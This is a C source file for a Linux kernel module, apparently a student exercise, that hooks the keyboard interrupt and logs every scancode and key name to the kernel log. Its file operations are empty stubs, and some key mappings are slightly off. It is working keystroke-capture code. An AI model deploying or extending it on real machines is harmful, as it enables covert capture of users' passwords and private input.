#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/hil.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sebastien Nicolet <snicolet@student.42.fr>");
MODULE_DESCRIPTION("keyboard bad keylogger");

#define	MODULE_NAME		"keylogger"
#define KEYBOARD_IRQ	1

struct key_map {
	char			acii;
	unsigned int	scancode;
	const char		*name;
	bool			pressed;
};

struct smart_buffer {
	char	*buf;
	size_t	size;
};

static struct smart_buffer key_log;

static struct key_map key_table[] = {
	(struct key_map){0x0, 0, "NUL", false},
	(struct key_map){0x1, 1, "Escape", false},
	(struct key_map){'\t', 15, "TAB", false},
	(struct key_map){0x7f, 14, "DEL", false},
	(struct key_map){'q', 16, "q", false},
	(struct key_map){'w', 17, "w", false},
	(struct key_map){'e', 18, "e", false},
	(struct key_map){'r', 19, "r", false},
	(struct key_map){'t', 20, "t", false},
	(struct key_map){'y', 21, "y", false},
	(struct key_map){'u', 22, "u", false},
	(struct key_map){'i', 23, "i", false},
	(struct key_map){'o', 24, "o", false},
	(struct key_map){'p', 25, "p", false},
	(struct key_map){'[', 26, "[", false},
	(struct key_map){']', 27, "]", false},
	(struct key_map){'\n', 28, "Enter", false},
	(struct key_map){0x0, 29, "Control-Left", false},
	(struct key_map){'a', 30, "a", false},
	(struct key_map){'s', 31, "s", false},
	(struct key_map){'d', 32, "d", false},
	(struct key_map){'f', 33, "f", false},
	(struct key_map){'g', 34, "g", false},
	(struct key_map){'h', 35, "h", false},
	(struct key_map){'j', 36, "j", false},
	(struct key_map){'k', 37, "k", false},
	(struct key_map){'l', 38, "l", false},
	(struct key_map){';', 39, ";", false},
	(struct key_map){'\'', 40, "'", false},
	(struct key_map){'-', 42, "Shift-Left", false},
	(struct key_map){'\\', 43, "\\", false},
	(struct key_map){'z', 44, "z", false},
	(struct key_map){'x', 45, "x", false},
	(struct key_map){'c', 46, "c", false},
	(struct key_map){'v', 47, "v", false},
	(struct key_map){'b', 48, "b", false},
	(struct key_map){'n', 49, "n", false},
	(struct key_map){'m', 50, "m", false},
	(struct key_map){',', 51, ",", false},
	(struct key_map){'.', 52, ".", false},
	(struct key_map){'/', 53, "/", false},
	(struct key_map){0x0, 54, "Shift-Right", false},
	(struct key_map){' ', 56, "Alt-Right", false},
	(struct key_map){' ', 57, "Space", false},
	(struct key_map){0x0, 58, "Caps-Lock", false},
	(struct key_map){0x0, 92, "Command-Right", false},
	(struct key_map){0x0, 0, NULL, false}
};

static struct key_map *get_key(const unsigned int scancode)
{
	size_t		i;

	i = 0;
	while (key_table[i].name) {
		if (key_table[i].scancode == scancode)
			return &key_table[i];
		i++;
	}
	return NULL;
}

static ssize_t	read_key(struct file *file, char __user *buf, size_t size,
	loff_t *offset)
{
	return 0;
}

static ssize_t	write_key(struct file *file, const char __user *buf, size_t size,
	loff_t *offset)
{
	return 0;
}

static const struct file_operations ops = {
	.read = read_key,
	.write = write_key
};

static irqreturn_t	key_handler(int irq, void *dev_id)
{
	unsigned int			scancode;
	struct key_map			*key;

	scancode = inb (0x60);
	key = get_key(scancode & 0x7f);
	if (key)
		key->pressed = (scancode & 0x80) == 0;

	pr_info("(scan: %3u) -> %s : %s\n", scancode, (key ? key->name : "/"),
		(key && key->pressed ? "pressed" : "released"));
	return IRQ_HANDLED;
}

static void		__exit hello_cleanup(void)
{
	pr_info(MODULE_NAME "Cleaning up module.\n");
	free_irq(KEYBOARD_IRQ, &key_handler);
	if (key_log.buf) {
		pr_info("cleaning log");
		memset(key_log.buf, 0, key_log.size);
		kfree(key_log.buf);
		key_log.buf = NULL;
		key_log.size = 0;
	}
}

static int		__init hello_init(void)
{
	int		ret;

	key_log = (struct smart_buffer){
		.buf = NULL,
		.size = 0
	};
	pr_info(MODULE_NAME "init !\n");
	ret = request_irq(KEYBOARD_IRQ, &key_handler, IRQF_SHARED, MODULE_NAME,
		&key_handler);
	if (ret < 0) {
		pr_err("failed to request keyboard irq: %d\n", ret);
		return ret;
	}
	return 0;
}

module_init(hello_init);
module_exit(hello_cleanup);
